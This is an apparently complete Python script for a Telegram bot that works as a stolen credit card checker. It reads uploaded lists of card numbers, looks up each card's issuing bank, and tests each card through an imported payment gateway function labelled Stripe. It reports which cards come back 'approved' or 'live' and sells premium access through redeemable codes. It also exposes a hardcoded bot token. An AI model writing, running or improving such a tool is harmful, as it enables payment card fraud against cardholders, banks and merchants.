import requests
import telebot
import time
import random
import os
from telebot import types
from gatet import Tele
from datetime import datetime, timedelta

# Initialize the bot with the token
token = '7761795687:AAGv7juezoNA4o4llye55jhQOdSFpV8cCc4'
bot = telebot.TeleBot(token, parse_mode="HTML")
subscriber = '6473717870'  # Admin ID

# Load premium users from db.txt
def load_premium_users():
    with open("db.txt", "r") as f:
        return set(user.strip() for user in f.readlines())

premium_users = load_premium_users()

# Generate a unique code with expiration and usage limit
def generate_code(expiration_days, usage_limit):
    code = f"{random.randint(100000, 999999)}-{random.randint(100000, 999999)}"
    expiration_date = (datetime.now() + timedelta(days=expiration_days)).strftime('%Y-%m-%d %H:%M:%S')
    return code, expiration_date, usage_limit

# Start command handler
@bot.message_handler(commands=["start"])
def start(message):
    if str(message.chat.id) != subscriber:
        bot.reply_to(message, " ᴰᵉᵛˡᵒᵖ ᴮʸ @ᶜʰᵏ¹²¹² Thura")
        return
    bot.reply_to(message, " ᴰᵉᵛˡᵒᵖ ᴮʸ @ᶜʰᵏ¹²¹² Send the file now")

# Generate code command handler
@bot.message_handler(commands=["code"])
def generate_code_command(message):
    if str(message.chat.id) != subscriber:  # Check if the user is the admin
        bot.reply_to(message, "ᴄᴏᴍᴇ @chk1212")
        return

    # Parse the command arguments
    try:
        args = message.text.split()
        expiration_days = int(args[1])
        usage_limit = int(args[2])
    except (IndexError, ValueError):
        bot.reply_to(message, "Please provide valid arguments. Usage: /code <days> <usage limit>")
        return

    # Generate code with expiration and usage limit
    code, expiration_date, usage_limit = generate_code(expiration_days, usage_limit)
    with open("codes.txt", "a") as f:
        f.write(f"{code}|{expiration_date}|{usage_limit}\n")
    bot.reply_to(message, f"Generated Code:\n<code>{code}</code>\nValid for {expiration_days} days, usable {usage_limit} time(s)")

# Redeem code command handler
@bot.message_handler(commands=["redeem"])
def redeem_code_command(message):
    # Allow admin (subscriber) to bypass premium user check
    if str(message.chat.id) != subscriber and str(message.chat.id) not in premium_users:
        bot.reply_to(message, "You need to be a premium user to redeem codes.")
        return

    code = message.text.split(" ")[1] if len(message.text.split()) > 1 else None
    if not code:
        bot.reply_to(message, "Please provide a code to redeem.")
        return

    with open("codes.txt", "r") as f:
        codes = f.read().splitlines()

    found = False
    for line in codes:
        saved_code, expiration_date, usage_limit = line.split("|")
        if saved_code == code:
            if datetime.now() > datetime.strptime(expiration_date, '%Y-%m-%d %H:%M:%S'):
                bot.reply_to(message, "This code has expired.")
                return
            if int(usage_limit) <= 0:
                bot.reply_to(message, "This code has already been used the maximum number of times.")
                return

            # Redeem the code
            usage_limit = int(usage_limit) - 1
            found = True
            break

    if not found:
        bot.reply_to(message, "Invalid or already redeemed code.")
        return

    # Update the codes file with new usage count
    with open("codes.txt", "w") as f:
        for line in codes:
            if line.startswith(code):
                f.write(f"{code}|{expiration_date}|{usage_limit}\n")
            else:
                f.write(line + "\n")

    # Update premium users
    premium_users.add(str(message.chat.id))
    with open("db.txt", "a") as f:
        f.write(f"{message.chat.id}\n")

    bot.reply_to(message, "Code redeemed successfully! You are now a premium user.")

# Document handler (remaining code unchanged)
@bot.message_handler(content_types=["document"])
def main(message):
    if str(message.chat.id) != subscriber:
        bot.reply_to(message, "ᴅᴏɴ'ᴛ ᴄᴏᴍᴇ @Thura")
        return
    # Continue with other processing...

# ... (continue with the rest of the original code

    dd = 0  # Declined count
    live = 0  # Approved count
    ko = bot.reply_to(message, "ᴄʜᴇᴄᴋɪɴɢ...⌛").message_id
    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)

    # Write the received file to combo.txt
    with open("combo.txt", "wb") as w:
        w.write(ee)

    try:
        with open("combo.txt", 'r') as file:
            lino = file.readlines()
            total = len(lino)

            for cc in lino:
                cc = cc.strip()  # Ensure whitespace is stripped from lines
                current_dir = os.getcwd()

                # Check for the stop signal
                if os.path.exists("stop.stop"):
                    bot.edit_message_text(chat_id=message.chat.id, message_id=ko,
                                          text='sᴛᴏᴘ ✅\nʙᴏᴛ ʙʏ ➜ @Thura')
                    os.remove('stop.stop')
                    return

                # Retrieve bank information
                try:
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
                    }
                    response = requests.get(f'https://lookup.binlist.net/{cc[:6]}', headers=headers)
                    if response.status_code == 200:
                        data = response.json()
                    else:
                        print(f"Error fetching bin")
                        data = {}

                except Exception as e:
                    print(f"Error fetching bank info: {e}")
                    data = {}

                # Handle missing data gracefully
                bank = data.get('bank', {}).get('name', 'ᴜɴᴋɴᴏᴡɴ')
                emj = data.get('country', {}).get('emoji', 'ᴜɴᴋɴᴏᴡɴ')
                cn = data.get('country', {}).get('name', 'ᴜɴᴋɴᴏᴡɴ')
                dicr = data.get('scheme', 'ᴜɴᴋɴᴏᴡɴ')
                typ = data.get('type', 'ᴜɴᴋɴᴏᴡɴ')

                # Run Tele function directly with cc input
                try:
                    response, current_ip = Tele(cc)  # Update to handle multiple return values
                    last = str(Tele(cc))  # Use the appropriate key from the response
                except Exception as e:
                	print(e)
                	last = "ERROR"
                if 'your card was declined.' in last or 'blocked' in last:
                	last='declined'
                elif 'Duplicate' in last:
                    last='Approved'
                    current_ip = "unknown"  # Define a default value if an error occurs

                # Prepare response messages
                mes = types.InlineKeyboardMarkup(row_width=1)
                cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
                status = types.InlineKeyboardButton(f"• sᴛᴀᴛᴜs ➠ {last} •", callback_data='u8')
                cm3 = types.InlineKeyboardButton(f"• ᴀᴘᴘʀᴏᴠᴇᴅ ✅ ➠ [ {live} ] •", callback_data='x')
                cm4 = types.InlineKeyboardButton(f"• ᴅᴇᴄʟɪɴᴇғ 📛 ➠ [ {dd} ] •", callback_data='x')
                cm5 = types.InlineKeyboardButton(f"• ᴛᴏᴛᴀʟ ☢ ➠ [ {total} ] •", callback_data='x')
                cm6 = types.InlineKeyboardButton(f"• ᴘʀᴏxʏ 🌐 ➠ [ {current_ip} ] •", callback_data='x')
                stop = types.InlineKeyboardButton(f"[ sᴛᴏᴘ ]", callback_data='stop')
                mes.add(cm1, status, cm3, cm4, cm5, cm6, stop)

                bot.edit_message_text(chat_id=message.chat.id, message_id=ko,
                                      text=''' ᴰᵉᵛˡᵒᵖ ᴮʸ @ᶜʰᵏ¹²¹² Wait for processing 
𝒃𝒚 ➜ @Thura ''', reply_markup=mes)

                # Build the result message with more emojis
                msg = f'''💳 ᴄᴀʀᴅ  ➪ {cc} 
❄ 𝘚𝘵𝘢𝘵𝘶𝘴 ➢ ᴀᴘᴘʀᴏᴠᴇᴅ 🔥
📊 𝘙𝘦𝘴𝘶𝘭𝘵 ➢ {last}
🔗 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 ➢ sᴛʀɪᴘᴇ
🔢 𝘉𝘪𝘯 ➢ {cc[:6]} - {dicr} - {typ} 
🌍 𝘊𝘰𝘶𝘯𝘵𝘳𝘺 ➢ {cn} - {emj} 
🏦 𝘉𝘢𝘯𝘬 ➢ {bank}
👤 𝘉𝘺 ➢ @chk1212
🔌 𝘗𝘳𝘰𝘹ʏ ➢ {current_ip} 🟢 
 ➣ ᴰᵉᵛˡᵒᵖ ᴮʸ @ᶜʰᵏ¹²¹² '''  # Use current_ip

                print(last)
                if 'Thank you for your purchase' in last or 'insufficient funds' in last or 'does not support' in last or 'security code is incorrect' in last or 'success' in last:
                    live += 1
                    bot.reply_to(message, msg)
                else:
                    dd += 1
                    time.sleep(5)

    except Exception as e:
        print(e)

    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='ᴄᴏᴍᴘʟᴇᴛᴇᴅ ✅\nʙᴏᴛ ʙʏ ➜ @Thura')

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    with open("stop.stop", "w") as file:
        pass

print("+-----------------------------------------------------------------+")
bot.polling()
